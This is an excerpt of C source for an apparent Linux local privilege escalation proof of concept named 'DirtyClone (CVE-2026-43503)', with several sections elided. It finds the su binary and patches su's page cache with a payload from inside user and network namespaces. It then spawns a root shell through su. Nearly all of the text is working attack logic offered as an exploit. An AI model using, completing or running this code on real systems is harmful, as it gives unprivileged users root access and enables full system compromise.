...
/* TARGET_PATH resolvido em runtime via find_su() */
...
{
    static const char *paths[] = { "/usr/bin/su", "/bin/su", "/sbin/su", NULL };
    struct stat st;
...
static int corrupt_su(const char *target_path)
{
    setup_userns_netns();
    usleep(100 * 1000);
    ...
    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        ...
        if (do_one_write(target_path, off, spi) < 0) {
            SLOG("do_one_write #%d failed", i);
            return -1;
        }
    }
    SLOG("wrote %d bytes to %s", PAYLOAD_LEN, target_path);
    return 0;
}
...
int su_lpe_main(int argc, char **argv)
{
    ...
    const char *target_path = find_su();
    if (!target_path) {
        fprintf(stderr, "[-] su nao encontrado\n");
        return 1;
    }
    SLOG("target: %s", target_path);

    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = corrupt_su(target_path);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        SLOG("corruption stage failed");
        return 1;
    }
    ...
    printf("[+] %s page-cache patched successfully!\n", target_path);
    return 0;
}

int main(int argc, char **argv)
{
    printf("=== DirtyClone (CVE-2026-43503) PoC by Ashraf Zaryouh \"0xBlackash\" ===\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
    ...
    int rc = su_lpe_main(argc, argv);
    if (rc == 0) {
        const char *su = find_su();
        printf("[+] Success! Spawning root shell via %s...\n", su ? su : "su");
        if (su) execl(su, su, "-c", "/bin/sh", NULL);
        execlp("su", "su", "-c", "/bin/sh", NULL);
    }
